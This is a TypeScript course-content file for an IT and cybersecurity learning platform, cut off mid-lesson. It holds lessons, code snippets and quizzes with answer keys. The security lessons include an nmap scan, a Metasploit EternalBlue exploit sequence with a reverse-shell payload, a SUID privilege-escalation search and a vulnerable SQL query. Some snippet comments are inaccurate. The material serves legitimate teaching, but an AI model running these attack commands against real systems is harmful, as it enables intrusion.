import { FrontierFaculty, FrontierFacultyModule, FrontierFacultyLesson, QuizQuestion } from '../../types';

export const DEEP_IT_CYBER_FACULTY: FrontierFaculty = {
  id: 'deep_it_cyber',
  name: 'Faculty of Deep IT, Cloud & Cyber Infrastructure',
  shortTitle: 'Deep IT & Cyber',
  iconName: 'Terminal',
  emoji: '💻',
  themeColor: 'cyan',
  accentHex: '#06b6d4',
  glowClass: 'shadow-[0_0_35px_rgba(6,182,212,0.25)]',
  borderClass: 'border-cyan-500/30 hover:border-cyan-400/60',
  bgLightClass: 'bg-cyan-500/10 text-cyan-400',
  badgeClass: 'bg-cyan-500/10 text-cyan-300 border border-cyan-500/30',
  headline: 'Distributed Systems, Bare-Metal Kernels & Zero-Trust Defense',
  description: 'Master low-level systems programming, Linux internals, cloud infrastructure, network protocols, and offensive cyber security operations.',
  difficulty: 'Hardcore Tactical',
  simulatorName: 'Linux/Terminal Code & Security Sandbox',
  simulatorTag: 'Live Syscall & Kernel Shell',
  estimatedHours: 120,
  totalXp: 3500,
  completionPercent: 0,
  drillNodes: [],
  modules: [
    {
      id: 'mod_dist_systems',
      code: '1.1',
      title: 'Distributed Systems & High-Concurrency Kernels',
      description: 'Master the principles of distributed computing, consensus algorithms, and high-concurrency systems.',
      lessons: [
        {
          id: 'deep_it_dist_1',
          title: 'CAP Theorem and Eventual Consistency',
          duration: '20 min',
          durationSeconds: 1200,
          completed: false,
          keyTakeaway: 'Understanding the trade-offs between Consistency, Availability, and Partition Tolerance is fundamental to designing distributed data stores.',
          codeSnippet: 'fn read_quorum(nodes: &[Node], w: usize, r: usize) -> Result<Data, Error> {\n    if w + r <= nodes.len() {\n        return Err(Error::InvalidQuorum);\n    }\n    // Implementation of read quorum logic\n    Ok(Data::default())\n}',
          drillQuestion: {
            id: 'q_deep_it_dist_1',
            prompt: 'In a distributed database, if a network partition occurs, the CAP theorem states that a system must choose between which two properties?',
            options: [
              'Consistency and Availability',
              'Durability and Availability',
              'Consistency and Scalability',
              'Partition Tolerance and Availability'
            ],
            correctIndex: 0,
            explanation: 'The CAP theorem asserts that in the presence of a network Partition, a distributed system must choose between Consistency and Availability.'
          }
        },
        {
          id: 'deep_it_dist_2',
          title: 'Raft Consensus Algorithm',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Raft provides a comprehensible approach to distributed consensus by separating leader election, log replication, and safety.',
          codeSnippet: 'type LogEntry = { term: number; command: any };\n\ninterface RaftNode {\n  state: "Follower" | "Candidate" | "Leader";\n  currentTerm: number;\n  votedFor: string | null;\n  log: LogEntry[];\n}',
          drillQuestion: {
            id: 'q_deep_it_dist_2',
            prompt: 'What role does a "Follower" play in the Raft consensus algorithm?',
            options: [
              'It dictates commands to other nodes',
              'It responds to requests from leaders and candidates',
              'It spontaneously starts elections without timeouts',
              'It directly serves write requests from clients'
            ],
            correctIndex: 1,
            explanation: 'Followers are passive; they issue no requests on their own but simply respond to requests from leaders and candidates.'
          }
        },
        {
          id: 'deep_it_dist_3',
          title: 'Concurrency in Go vs Rust',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Go utilizes goroutines and channels for CSP (Communicating Sequential Processes), while Rust emphasizes safe, zero-cost abstractions through its ownership model.',
          codeSnippet: '// Rust thread spawn with Arc/Mutex\nuse std::sync::{Arc, Mutex};\nuse std::thread;\n\nlet data = Arc::new(Mutex::new(0));\nlet data_clone = Arc::clone(&data);\nthread::spawn(move || {\n    let mut lock = data_clone.lock().unwrap();\n    *lock += 1;\n});',
          drillQuestion: {
            id: 'q_deep_it_dist_3',
            prompt: 'What mechanism does Rust use to prevent data races at compile time?',
            options: [
              'Global Interpreter Lock (GIL)',
              'Garbage Collection (GC)',
              'Ownership and Borrowing rules',
              'Goroutines'
            ],
            correctIndex: 2,
            explanation: 'Rust enforces memory safety and prevents data races at compile time via its strict Ownership, Borrowing, and Lifetimes system.'
          }
        },
        {
          id: 'deep_it_dist_4',
          title: 'Message Queues: Kafka & RabbitMQ',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Message brokers decouple microservices. Kafka excels at high-throughput event streaming, while RabbitMQ is optimized for complex routing.',
          codeSnippet: '# Starting a Kafka producer using CLI\nkafka-console-producer.sh --broker-list localhost:9092 --topic distributed-events',
          drillQuestion: {
            id: 'q_deep_it_dist_4',
            prompt: 'Which scenario is best suited for Apache Kafka over RabbitMQ?',
            options: [
              'Complex message routing based on headers',
              'Storing a persistent stream of high-throughput telemetry data for replay',
              'Simple RPC (Remote Procedure Call) patterns',
              'Low latency, single-consumer job queues'
            ],
            correctIndex: 1,
            explanation: 'Kafka is designed as a distributed commit log, making it ideal for persistent, high-throughput event streaming and replayability.'
          }
        },
        {
          id: 'deep_it_dist_5',
          title: 'Asynchronous I/O and epoll',
          duration: '35 min',
          durationSeconds: 2100,
          completed: false,
          keyTakeaway: 'High-performance servers rely on asynchronous I/O multiplexing like epoll (Linux) or kqueue (FreeBSD) to handle millions of connections efficiently.',
          codeSnippet: '#include <sys/epoll.h>\n\nint epoll_fd = epoll_create1(0);\nstruct epoll_event event;\nevent.events = EPOLLIN;\nevent.data.fd = server_socket;\nepoll_ctl(epoll_fd, EPOLL_CTL_ADD, server_socket, &event);',
          drillQuestion: {
            id: 'q_deep_it_dist_5',
            prompt: 'Why is `epoll` preferred over `select` in Linux for high-concurrency servers?',
            options: [
              'epoll supports Windows natively',
              'epoll operates in O(1) time complexity regarding the number of active connections',
              'select is not part of POSIX',
              'epoll executes blocking I/O internally'
            ],
            correctIndex: 1,
            explanation: 'Unlike `select` or `poll` which scan all file descriptors (O(N)), `epoll` maintains a ready list, yielding O(1) performance for active events.'
          }
        },
        {
          id: 'deep_it_dist_6',
          title: 'Distributed Tracing and Observability',
          duration: '20 min',
          durationSeconds: 1200,
          completed: false,
          keyTakeaway: 'Observability in distributed systems requires passing trace IDs across service boundaries to correlate logs, metrics, and traces (e.g., using OpenTelemetry).',
          codeSnippet: 'import { trace } from "@opentelemetry/api";\n\nconst tracer = trace.getTracer("my-service");\ntracer.startActiveSpan("processOrder", (span) => {\n  // do work\n  span.end();\n});',
          drillQuestion: {
            id: 'q_deep_it_dist_6',
            prompt: 'What is the primary purpose of a "Trace ID" in distributed tracing?',
            options: [
              'To uniquely identify a single microservice node',
              'To encrypt log payloads',
              'To correlate a single request as it traverses multiple services',
              'To optimize database index lookups'
            ],
            correctIndex: 2,
            explanation: 'A Trace ID tracks an entire transaction across multiple boundaries, enabling developers to stitch together logs and performance data for that specific request.'
          }
        }
      ]
    },
    {
      id: 'mod_cloud_k8s',
      code: '1.2',
      title: 'Cloud DevOps & Kubernetes Orchestration',
      description: 'Master container orchestration, cluster management, and scalable cloud deployments.',
      lessons: [
        {
          id: 'deep_it_k8s_1',
          title: 'Kubernetes Architecture Basics',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Kubernetes consists of a control plane (API server, etcd, scheduler, controller manager) and worker nodes (kubelet, kube-proxy, container runtime).',
          codeSnippet: '# Check cluster status and control plane components\nkubectl get componentstatuses\nkubectl get nodes -o wide',
          drillQuestion: {
            id: 'q_deep_it_k8s_1',
            prompt: 'Which component is responsible for storing cluster state and configuration in Kubernetes?',
            options: [
              'kube-scheduler',
              'etcd',
              'kubelet',
              'kube-proxy'
            ],
            correctIndex: 1,
            explanation: 'etcd is a highly-available key-value store used as Kubernetes backing store for all cluster data.'
          }
        },
        {
          id: 'deep_it_k8s_2',
          title: 'Deployments, ReplicaSets, and Pods',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Deployments manage ReplicaSets, which in turn ensure that a specified number of Pod replicas are running at any given time.',
          codeSnippet: 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deploy\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2',
          drillQuestion: {
            id: 'q_deep_it_k8s_2',
            prompt: 'What is the smallest deployable compute unit in Kubernetes?',
            options: [
              'Container',
              'Node',
              'Pod',
              'Service'
            ],
            correctIndex: 2,
            explanation: 'A Pod is the smallest and simplest unit in the Kubernetes object model that you create or deploy.'
          }
        },
        {
          id: 'deep_it_k8s_3',
          title: 'Services and Ingress Controllers',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Services provide stable internal IPs for Pods. Ingress exposes HTTP/HTTPS routes from outside the cluster to services within the cluster.',
          codeSnippet: 'apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: minimal-ingress\nspec:\n  rules:\n  - http:\n      paths:\n      - path: /testpath\n        pathType: Prefix\n        backend:\n          service:\n            name: test\n            port:\n              number: 80',
          drillQuestion: {
            id: 'q_deep_it_k8s_3',
            prompt: 'Which Kubernetes Service type provisions an external load balancer from the cloud provider?',
            options: [
              'ClusterIP',
              'NodePort',
              'LoadBalancer',
              'ExternalName'
            ],
            correctIndex: 2,
            explanation: 'The LoadBalancer service type automatically provisions an external load balancer to route traffic to your service.'
          }
        },
        {
          id: 'deep_it_k8s_4',
          title: 'StatefulSets and Persistent Volumes',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'StatefulSets manage stateful applications, providing guarantees about the ordering and uniqueness of Pods, often paired with PersistentVolumeClaims.',
          codeSnippet: 'apiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: my-pvc\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 10Gi',
          drillQuestion: {
            id: 'q_deep_it_k8s_4',
            prompt: 'Why would you use a StatefulSet instead of a Deployment?',
            options: [
              'For stateless web servers',
              'To guarantee ordered, graceful deployment and scaling, and stable persistent storage',
              'To run batch jobs to completion',
              'To run a daemon on every node'
            ],
            correctIndex: 1,
            explanation: 'StatefulSets are valuable for applications that require stable, unique network identifiers, stable persistent storage, and ordered scaling.'
          }
        },
        {
          id: 'deep_it_k8s_5',
          title: 'Helm: The Kubernetes Package Manager',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Helm packages Kubernetes manifests into Charts, enabling templating, versioning, and easy deployment of complex applications.',
          codeSnippet: '# Install a Helm chart\nhelm repo add bitnami https://charts.bitnami.com/bitnami\nhelm install my-release bitnami/mysql',
          drillQuestion: {
            id: 'q_deep_it_k8s_5',
            prompt: 'In Helm terminology, what is a "Chart"?',
            options: [
              'A graphical representation of the cluster',
              'A collection of files that describe a related set of Kubernetes resources',
              'The executing instance of a release',
              'A specific YAML syntax checker'
            ],
            correctIndex: 1,
            explanation: 'A Chart is a Helm package that contains all of the resource definitions necessary to run an application, tool, or service inside a Kubernetes cluster.'
          }
        }
      ]
    },
    {
      id: 'mod_cyber_defense',
      code: '1.3',
      title: 'Zero-Trust Cyber Defense & Penetration Testing',
      description: 'Learn offensive security principles and how to architect unbreachable zero-trust environments.',
      lessons: [
        {
          id: 'deep_it_sec_1',
          title: 'Zero-Trust Architecture Fundamentals',
          duration: '20 min',
          durationSeconds: 1200,
          completed: false,
          keyTakeaway: 'Zero Trust assumes the network is already compromised and demands continuous verification (identity, device posture) for every resource access.',
          codeSnippet: '# Example of an Istio AuthorizationPolicy for Zero Trust\napiVersion: security.istio.io/v1beta1\nkind: AuthorizationPolicy\nmetadata:\n  name: require-mtls\nspec:\n  action: DENY\n  rules:\n  - from:\n    - source:\n        notPrincipals: ["cluster.local/ns/default/sa/frontend"]',
          drillQuestion: {
            id: 'q_deep_it_sec_1',
            prompt: 'What is the core motto of the Zero Trust security model?',
            options: [
              'Trust, but verify',
              'Never trust, always verify',
              'Defense in depth',
              'Security by obscurity'
            ],
            correctIndex: 1,
            explanation: 'Zero Trust removes implicit trust and requires continuous authentication and authorization: "Never trust, always verify."'
          }
        },
        {
          id: 'deep_it_sec_2',
          title: 'Network Reconnaissance (Nmap & OSINT)',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Reconnaissance is the first phase of a penetration test. Tools like Nmap identify open ports and services, while OSINT maps the human and digital surface.',
          codeSnippet: '# Aggressive stealth SYN scan with OS detection\nnmap -sS -A -T4 target_ip',
          drillQuestion: {
            id: 'q_deep_it_sec_2',
            prompt: 'In Nmap, what does the `-sS` flag perform?',
            options: [
              'UDP Scan',
              'Full Connect Scan',
              'TCP SYN (Stealth) Scan',
              'Ping Sweep'
            ],
            correctIndex: 2,
            explanation: 'The `-sS` flag initiates a TCP SYN scan, often called a stealth scan, as it does not complete the full TCP 3-way handshake.'
          }
        },
        {
          id: 'deep_it_sec_3',
          title: 'Exploitation frameworks (Metasploit)',
          duration: '35 min',
          durationSeconds: 2100,
          completed: false,
          keyTakeaway: 'Metasploit provides a standardized framework for developing, testing, and executing exploit code against remote target machines.',
          codeSnippet: 'msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit',
          drillQuestion: {
            id: 'q_deep_it_sec_3',
            prompt: 'What is a "payload" in the context of the Metasploit Framework?',
            options: [
              'The vulnerability being exploited',
              'The code that runs on the target system after exploitation',
              'The tool used to scan the network',
              'The log file generated after the attack'
            ],
            correctIndex: 1,
            explanation: 'A payload is the actual code that the exploit delivers and executes on the target system (e.g., providing a reverse shell).'
          }
        },
        {
          id: 'deep_it_sec_4',
          title: 'Web App Vulnerabilities (OWASP Top 10)',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Understanding injection, broken authentication, and XSS is crucial; sanitizing inputs and using parameterized queries prevents the majority of web exploits.',
          codeSnippet: '// Vulnerable SQL\nconst query = `SELECT * FROM users WHERE email = \'${req.body.email}\'`;\n\n// Secure Parameterized SQL\nconst safeQuery = \'SELECT * FROM users WHERE email = $1\';\ndb.query(safeQuery, [req.body.email]);',
          drillQuestion: {
            id: 'q_deep_it_sec_4',
            prompt: 'Which vulnerability occurs when untrusted data is sent to an interpreter as part of a command or query?',
            options: [
              'Cross-Site Scripting (XSS)',
              'Injection (e.g., SQL Injection)',
              'Security Misconfiguration',
              'Insecure Direct Object Reference (IDOR)'
            ],
            correctIndex: 1,
            explanation: 'Injection flaws, such as SQL, NoSQL, or command injection, occur when untrusted data alters the intended command structure.'
          }
        },
        {
          id: 'deep_it_sec_5',
          title: 'Privilege Escalation Techniques',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Attackers use privilege escalation (e.g., misconfigured SUID binaries, kernel exploits) to gain root/administrator access after securing an initial low-privilege foothold.',
          codeSnippet: '# Find files with SUID bit set\nfind / -perm -4000 -type f 2>/dev/null',
          drillQuestion: {
            id: 'q_deep_it_sec_5',
            prompt: 'What does an SUID bit do on a Linux executable?',
            options: [
              'Makes the file readable by everyone',
              'Encrypts the executable',
              'Executes the file with the privileges of the file owner',
              'Prevents the file from being modified'
            ],
            correctIndex: 2,
            explanation: 'The SUID (Set owner User ID) bit allows users to run an executable with the permissions of the executable\'s owner, which can be dangerous if the owner is root.'
          }
        },
        {
          id: 'deep_it_sec_6',
          title: 'Identity and Access Management (IAM)',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Implementing robust IAM using Principle of Least Privilege and Role-Based Access Control (RBAC) is the cornerstone of cloud security.',
          codeSnippet: '{\n  "Version": "2012-10-17",\n  "Statement": [{\n    "Effect": "Allow",\n    "Action": ["s3:ListBucket"],\n    "Resource": "arn:aws:s3:::my-secure-bucket"\n  }]\n}',
          drillQuestion: {
            id: 'q_deep_it_sec_6',
            prompt: 'What principle dictates that users should only be granted the minimum permissions necessary to perform their tasks?',
            options: [
              'Defense in Depth',
              'Separation of Duties',
              'Principle of Least Privilege',
              'Fail-Safe Defaults'
            ],
            correctIndex: 2,
            explanation: 'The Principle of Least Privilege limits access rights for users and applications to the bare minimum required to function.'
          }
        }
      ]
    },
    {
      id: 'mod_gpu_db',
      code: '1.4',
      title: 'GPU Compute & Database Sharding',
      description: 'Harness massive parallel computing and scale databases infinitely.',
      lessons: [
        {
          id: 'deep_it_gpu_1',
          title: 'CUDA Programming Basics',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'CUDA allows developers to execute code on NVIDIA GPUs by dividing tasks into grids, blocks, and threads for massive parallel execution.',
          codeSnippet: '__global__ void vectorAdd(float *A, float *B, float *C, int N) {\n    int i = blockDim.x * blockIdx.x + threadIdx.x;\n    if (i < N) C[i] = A[i] + B[i];\n}\n// Launch with: vectorAdd<<<blocksPerGrid, threadsPerBlock>>>(d_A, d_B, d_C, N);',
          drillQuestion: {
            id: 'q_deep_it_gpu_1',
            prompt: 'In CUDA, what keyword indicates that a function executes on the GPU and is callable from the CPU?',
            options: [
              '__device__',
              '__host__',
              '__global__',
              '__shared__'
            ],
            correctIndex: 2,
            explanation: '__global__ designates a kernel function, which runs on the device (GPU) and is called from the host (CPU).'
          }
        },
        {
          id: 'deep_it_gpu_2',
          title: 'GPU Memory Architecture',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Optimizing GPU performance requires careful management of global memory, shared memory, and minimizing host-to-device data transfers.',
          codeSnippet: '__shared__ float sharedData[256];\nint tid = threadIdx.x;\nsharedData[tid] = globalData[tid];\n__syncthreads(); // Wait for all threads to load',
          drillQuestion: {
            id: 'q_deep_it_gpu_2',
            prompt: 'Which type of GPU memory is explicitly managed by the programmer and shared among threads in the same block?',
            options: [
              'Global Memory',
              'Shared Memory',
              'Local Memory',
              'Constant Memory'
            ],
            correctIndex: 1,
            explanation: 'Shared memory is on-chip, extremely fast, and shared across all threads within a block, acting like a programmable cache.'
          }
        },
        {
          id: 'deep_it_gpu_3',
          title: 'Database Sharding Strategies',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Sharding horizontally partitions data across multiple nodes. Key-based (hash) and Range-based are common strategies, each with performance trade-offs.',
          codeSnippet: '// Simple hash-based sharding logic\nfunction getShardId(userId, numShards) {\n  return hash(userId) % numShards;\n}',
          drillQuestion: {
            id: 'q_deep_it_gpu_3',
            prompt: 'What is a major risk of Range-based sharding?',
            options: [
              'It requires complex hash functions',
              'It often creates data hotspots if sequential keys are heavily accessed',
              'It prevents horizontal scaling',
              'It does not support secondary indexes'
            ],
            correctIndex: 1,
            explanation: 'Range-based sharding can lead to hotspots (e.g., if inserting data by timestamp, all new writes hit a single shard).'
          }
        },
        {
          id: 'deep_it_gpu_4',
          title: 'Consistent Hashing in Databases',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Consistent hashing minimizes data reorganization when shards (nodes) are added or removed, vital for dynamic distributed databases like Cassandra.',
          codeSnippet: '// Abstract representation of consistent hashing ring\nnode = hashRing.ceilingEntry(hash(key)) ?? hashRing.firstEntry();',
          drillQuestion: {
            id: 'q_deep_it_gpu_4',
            prompt: 'Why is consistent hashing preferred over traditional modulo hashing (`hash(key) % N`) for distributed caches/databases?',
            options: [
              'It is computationally faster',
              'It only requires moving a small fraction of keys when node count changes',
              'It prevents hash collisions entirely',
              'It encrypts the data automatically'
            ],
            correctIndex: 1,
            explanation: 'When N changes in modulo hashing, almost all keys remap. Consistent hashing only remaps keys from the added/removed node, maintaining stability.'
          }
        },
        {
          id: 'deep_it_gpu_5',
          title: 'Vector Databases for AI/ML',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Vector databases (like Milvus or Pinecone) use GPUs and specialized indexes (HNSW) to rapidly execute similarity searches on high-dimensional embeddings.',
          codeSnippet: '# Searching a vector DB for similar embeddings\nresults = index.query(vector=query_embedding, top_k=5)\nprint(results.matches)',
          drillQuestion: {
            id: 'q_deep_it_gpu_5',
            prompt: 'What is the primary mathematical operation used to find similar items in a vector database?',
            options: [
              'Inner Join',
              'Cosine Similarity or Euclidean Distance',
              'SHA-256 Hashing',
              'B-Tree Traversal'
            ],
            correctIndex: 1,
            explanation: 'Vector databases calculate distances between vectors using metrics like Cosine Similarity, Euclidean Distance, or Dot Product.'
          }
        }
      ]
    },
    {
      id: 'mod_linux_internals',
      code: '1.5',
      title: 'Linux From Scratch: Kernel Internals & System Programming',
      description: 'Go deep into the Linux kernel, system calls, memory management, and IPC.',
      lessons: [
        {
          id: 'deep_it_linux_1',
          title: 'System Calls and the Kernel Boundary',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'System calls are the interface between user space and kernel space, implemented via CPU traps or specialized instructions (syscall).',
          codeSnippet: 'section .text\nglobal _start\n_start:\n    mov rax, 1      ; sys_write\n    mov rdi, 1      ; stdout\n    mov rsi, msg    ; buffer\n    mov rdx, 13     ; length\n    syscall',
          drillQuestion: {
            id: 'q_deep_it_linux_1',
            prompt: 'What occurs at the CPU level when a user program makes a system call?',
            options: [
              'A standard C function is executed in user mode',
              'A context switch to kernel mode is triggered via a software interrupt or syscall instruction',
              'The program crashes if not running as root',
              'The memory is immediately swapped to disk'
            ],
            correctIndex: 1,
            explanation: 'A system call safely transitions CPU execution from user mode (Ring 3) to kernel mode (Ring 0) to execute privileged operations.'
          }
        },
        {
          id: 'deep_it_linux_2',
          title: 'Process Management & Forks',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'In Linux, `fork()` creates a new process by duplicating the calling process. `exec()` replaces the process image with a new one.',
          codeSnippet: '#include <unistd.h>\npid_t pid = fork();\nif (pid == 0) {\n    // Child process\n    execl("/bin/ls", "ls", NULL);\n}',
          drillQuestion: {
            id: 'q_deep_it_linux_2',
            prompt: 'What value does `fork()` return in the child process?',
            options: [
              '-1',
              'The PID of the parent',
              '0',
              'The PID of the child'
            ],
            correctIndex: 2,
            explanation: '`fork()` returns 0 in the child process, while it returns the child\'s PID to the parent process.'
          }
        },
        {
          id: 'deep_it_linux_3',
          title: 'Memory Management and Virtual Memory',
          duration: '35 min',
          durationSeconds: 2100,
          completed: false,
          keyTakeaway: 'The kernel provides each process with a contiguous virtual memory space, mapped to physical memory via the Page Table and MMU.',
          codeSnippet: '# Allocate memory mapped directly via mmap\n#include <sys/mman.h>\nvoid *ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);',
          drillQuestion: {
            id: 'q_deep_it_linux_3',
            prompt: 'What is a "Page Fault"?',
            options: [
              'A critical hardware failure in the RAM',
              'An exception raised when a program accesses a virtual page not currently in physical memory',
              'A permission error when writing to read-only memory',
              'A compiler error regarding memory allocation'
            ],
            correctIndex: 1,
            explanation: 'A page fault triggers the OS to fetch the required page from disk (swap) or allocate new physical frames and update the page table.'
          }
        },
        {
          id: 'deep_it_linux_4',
          title: 'Inter-Process Communication (IPC)',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Pipes, Message Queues, Shared Memory, and Unix Domain Sockets allow independent processes to safely share data.',
          codeSnippet: 'int pipefd[2];\npipe(pipefd);\n// pipefd[0] is for reading\n// pipefd[1] is for writing',
          drillQuestion: {
            id: 'q_deep_it_linux_4',
            prompt: 'Which IPC mechanism provides the fastest data exchange between processes on the same machine?',
            options: [
              'Named Pipes (FIFOs)',
              'Message Queues',
              'Shared Memory',
              'TCP Sockets'
            ],
            correctIndex: 2,
            explanation: 'Shared memory is the fastest IPC method because data doesn\'t need to be copied between user and kernel space; both processes access the same physical memory.'
          }
        },
        {
          id: 'deep_it_linux_5',
          title: 'cgroups and namespaces (The roots of containers)',
          duration: '35 min',
          durationSeconds: 2100,
          completed: false,
          keyTakeaway: 'Containers are not magic. They are just Linux processes utilizing `namespaces` for isolation (PID, Mount, Network) and `cgroups` for resource limits (CPU, RAM).',
          codeSnippet: '# Creating an isolated shell in a new PID namespace\nunshare --pid --fork --mount-proc /bin/bash',
          drillQuestion: {
            id: 'q_deep_it_linux_5',
            prompt: 'Which Linux kernel feature restricts how much memory or CPU a process can use?',
            options: [
              'chroot',
              'namespaces',
              'cgroups (control groups)',
              'SELinux'
            ],
            correctIndex: 2,
            explanation: 'Control groups (cgroups) limit, account for, and isolate the resource usage (CPU, memory, disk I/O) of a collection of processes.'
          }
        },
        {
          id: 'deep_it_linux_6',
          title: 'eBPF: The Superpowers of Linux',
          duration: '35 min',
          durationSeconds: 2100,
          completed: false,
          keyTakeaway: 'eBPF allows safe execution of sandboxed programs inside the Linux kernel without changing kernel source code or loading modules, enabling elite observability and security.',
          codeSnippet: '# Simple bpftrace to log sys_execve\nbpftrace -e \'tracepoint:syscalls:sys_enter_execve { printf("Executed: %s\\\\n", str(args->filename)); }\'',
          drillQuestion: {
            id: 'q_deep_it_linux_6',
            prompt: 'Why is eBPF considered safer than traditional Linux Kernel Modules (LKM)?',
            options: [
              'It runs in user space',
              'It runs through an in-kernel verifier to prevent infinite loops and invalid memory access',
              'It only monitors network traffic',
              'It uses Java Virtual Machine'
            ],
            correctIndex: 1,
            explanation: 'Before an eBPF program runs, the kernel verifier statically analyzes it to ensure it won\'t crash the kernel or run indefinitely.'
          }
        }
      ]
    },
    {
      id: 'mod_networking',
      code: '1.6',
      title: 'Networking Mastery: TCP/IP, BGP, DNS & Load Balancing',
      description: 'Understand the lifeblood of the internet, from low-level packets to global traffic routing.',
      lessons: [
        {
          id: 'deep_it_net_1',
          title: 'The OSI Model and TCP/IP',
          duration: '20 min',
          durationSeconds: 1200,
          completed: false,
          keyTakeaway: 'The OSI model abstracts network communication into 7 layers. TCP/IP is the practical 4-layer implementation running the internet.',
          codeSnippet: '# Capture ICMP packets at the network layer\ntcpdump -i eth0 icmp',
          drillQuestion: {
            id: 'q_deep_it_net_1',
            prompt: 'At which OSI layer do routers primarily operate?',
            options: [
              'Data Link Layer (Layer 2)',
              'Network Layer (Layer 3)',
              'Transport Layer (Layer 4)',
              'Application Layer (Layer 7)'
            ],
            correctIndex: 1,
            explanation: 'Routers operate at the Network Layer (Layer 3), making decisions based on IP addresses to forward packets.'
          }
        },
        {
          id: 'deep_it_net_2',
          title: 'TCP Handshake and Congestion Control',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'TCP ensures reliable delivery via the SYN-SYN/ACK-ACK 3-way handshake and handles network congestion using algorithms like Cubic or BBR.',
          codeSnippet: '# View TCP congestion control algorithm\nsysctl net.ipv4.tcp_congestion_control',
          drillQuestion: {
            id: 'q_deep_it_net_2',
            prompt: 'In the TCP 3-way handshake, what packet does the server send in response to an initial SYN from the client?',
            options: [
              'ACK',
              'SYN',
              'SYN-ACK',
              'FIN'
            ],
            correctIndex: 2,
            explanation: 'The server acknowledges the client\'s SYN and sends its own sequence number in a combined SYN-ACK packet.'
          }
        },
        {
          id: 'deep_it_net_3',
          title: 'BGP and Autonomous Systems',
          duration: '35 min',
          durationSeconds: 2100,
          completed: false,
          keyTakeaway: 'The Border Gateway Protocol (BGP) is the routing protocol that makes the internet work, routing traffic between different Autonomous Systems (AS).',
          codeSnippet: 'router bgp 65000\n neighbor 192.168.1.1 remote-as 65001\n network 10.0.0.0 mask 255.255.255.0',
          drillQuestion: {
            id: 'q_deep_it_net_3',
            prompt: 'What metric does BGP primarily use to determine the best path?',
            options: [
              'Lowest latency',
              'Shortest AS Path length',
              'Highest bandwidth available',
              'Smallest packet drop rate'
            ],
            correctIndex: 1,
            explanation: 'BGP is a path-vector protocol. Its primary path selection attribute is the AS-PATH length (choosing the route traversing the fewest Autonomous Systems).'
          }
        },
        {
          id: 'deep_it_net_4',
          title: 'Advanced DNS: Records and Resolution',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'DNS resolves names to IPs. Understanding A, AAAA, CNAME, TXT, and MX records is essential for service discovery and domain verification.',
          codeSnippet: '# Query the authoritative nameserver directly\ndig @8.8.8.8 example.com A',
          drillQuestion: {
            id: 'q_deep_it_net_4',
            prompt: 'Which DNS record type is used to map an alias name to a true, canonical domain name?',
            options: [
              'A Record',
              'TXT Record',
              'CNAME Record',
              'NS Record'
            ],
            correctIndex: 2,
            explanation: 'A CNAME (Canonical Name) record aliases one name to another, so multiple names can point to the same host.'
          }
        },
        {
          id: 'deep_it_net_5',
          title: 'L4 vs L7 Load Balancing',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Layer 4 balancers (e.g., HAProxy TCP mode) forward packets based on IP/Port. Layer 7 balancers (e.g., Nginx, ALB) inspect HTTP headers and paths for routing.',
          codeSnippet: '# Nginx Layer 7 Load Balancing\nupstream backend {\n    server web1.example.com;\n    server web2.example.com;\n}\nserver {\n    location / {\n        proxy_pass http://backend;\n    }\n}',
          drillQuestion: {
            id: 'q_deep_it_net_5',
            prompt: 'If you need to route user traffic based on the URL path (e.g., `/api` vs `/static`), which type of load balancer is required?',
            options: [
              'Layer 2 Load Balancer',
              'Layer 3 Load Balancer',
              'Layer 4 Load Balancer',
              'Layer 7 Load Balancer'
            ],
            correctIndex: 3,
            explanation: 'Layer 7 load balancers operate at the Application layer and can inspect HTTP metadata, such as URL paths or cookies, to make routing decisions.'
          }
        },
        {
          id: 'deep_it_net_6',
          title: 'Software-Defined Networking (SDN)',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'SDN separates the network control plane (routing logic) from the data plane (packet forwarding), allowing programmatic network configuration.',
          codeSnippet: '# Open vSwitch (OVS) example: add a bridge\novs-vsctl add-br br-int',
          drillQuestion: {
            id: 'q_deep_it_net_6',
            prompt: 'In SDN architectures, what is decoupled from the physical networking hardware?',
            options: [
              'The power supply',
